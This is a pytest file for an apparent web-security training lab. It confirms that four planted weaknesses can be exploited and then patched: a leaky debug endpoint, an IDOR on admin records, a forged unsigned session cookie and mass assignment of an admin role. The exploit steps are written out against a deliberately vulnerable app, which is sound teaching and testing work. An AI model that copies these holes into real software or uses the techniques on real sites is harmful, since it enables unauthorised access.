"""Every planted weakness must be exploitable, and each patch must actually close it."""

import base64
import json

import pytest
from fastapi.testclient import TestClient

from vault.config import Settings
from vault.main import create_app


@pytest.fixture
def client():
    return TestClient(create_app(Settings()))


def new_facility(client):
    return client.post("/hack/api/sessions").json()["id"]


def forge_admin_cookie(client, sid):
    body = base64.urlsafe_b64encode(json.dumps({"role": "admin"}).encode()).decode().rstrip("=")
    client.cookies.set("sess", f"{body}.forged", path="/hack")


def breach(client, sid, flag):
    return client.post(f"/hack/api/sessions/{sid}/breach", json={"flag": flag})


def test_debug_endpoint_leaks_then_is_patched(client):
    sid = new_facility(client)
    js = client.get(f"/hack/api/{sid}/config.js").text
    assert "_debug?diag=full" in js  # the hint the developer left in client code
    flag = client.get(f"/hack/api/{sid}/_debug", params={"diag": "full"}).json()["perimeter_key"]
    assert breach(client, sid, flag).json()["breached"] == "debug_endpoint"
    # Patched: the same request is now forbidden and the old flag is void.
    assert client.get(f"/hack/api/{sid}/_debug", params={"diag": "full"}).status_code == 403
    assert breach(client, sid, flag).status_code in (400, 409)


def test_idor_exposes_admin_record_then_is_patched(client):
    sid = new_facility(client)
    assert client.get(f"/hack/api/{sid}/records/2").json()["role"] == "guest"
    flag = client.get(f"/hack/api/{sid}/records/1").json()["note"].split()[-1]
    assert breach(client, sid, flag).json()["breached"] == "idor"
    assert client.get(f"/hack/api/{sid}/records/1").status_code == 403


def test_forged_cookie_opens_vault_until_signatures_are_enforced(client):
    sid = new_facility(client)
    forge_admin_cookie(client, sid)
    opened = client.get(f"/hack/api/{sid}/vault").json()
    assert opened["status"] == "unlocked"
    assert breach(client, sid, opened["vault_key"]).json()["breached"] == "cookie_forgery"
    # Patched: a forged (unsigned) cookie is now rejected.
    forge_admin_cookie(client, sid)
    assert client.get(f"/hack/api/{sid}/vault").status_code == 403


def test_mass_assignment_promotes_to_admin_then_is_patched(client):
    sid = new_facility(client)
    # Close cookie forgery first so this must use a server-signed admin cookie.
    forge_admin_cookie(client, sid)
    breach(client, sid, client.get(f"/hack/api/{sid}/vault").json()["vault_key"])
    client.cookies.clear()

    client.post(f"/hack/api/{sid}/profile", json={"name": "me", "role": "admin"})
    opened = client.get(f"/hack/api/{sid}/vault").json()
    assert opened["status"] == "unlocked"
    assert breach(client, sid, opened["vault_key"]).json()["breached"] == "mass_assignment"
    # Patched: the profile no longer accepts a client-supplied role.
    client.cookies.clear()
    client.post(f"/hack/api/{sid}/profile", json={"name": "me", "role": "admin"})
    assert client.get(f"/hack/api/{sid}/vault").status_code == 403


def test_hints_and_hardened_state(client):
    sid = new_facility(client)
    first = client.post(f"/hack/api/sessions/{sid}/hint").json()
    assert first["revealed_hints"] and "config.js" in first["revealed_hints"][0]
    # Walk the whole facility shut and confirm it reports hardened.
    for _ in range(10):
        state = client.get(f"/hack/api/sessions/{sid}").json()
        if state["hardened"]:
            break
        sid_flag = _capture_any(client, sid)
        breach(client, sid, sid_flag)
    assert client.get(f"/hack/api/sessions/{sid}").json()["hardened"] is True


def _capture_any(client, sid):
    """Grab a valid flag for whichever weakness is currently open."""
    if client.get(f"/hack/api/{sid}/_debug", params={"diag": "full"}).status_code == 200:
        return client.get(f"/hack/api/{sid}/_debug", params={"diag": "full"}).json()["perimeter_key"]
    if client.get(f"/hack/api/{sid}/records/1").status_code == 200:
        return client.get(f"/hack/api/{sid}/records/1").json()["note"].split()[-1]
    forge_admin_cookie(client, sid)
    forged = client.get(f"/hack/api/{sid}/vault")
    client.cookies.clear()
    if forged.status_code == 200:
        return forged.json()["vault_key"]
    client.post(f"/hack/api/{sid}/profile", json={"role": "admin"})
    key = client.get(f"/hack/api/{sid}/vault").json()["vault_key"]
    client.cookies.clear()
    return key
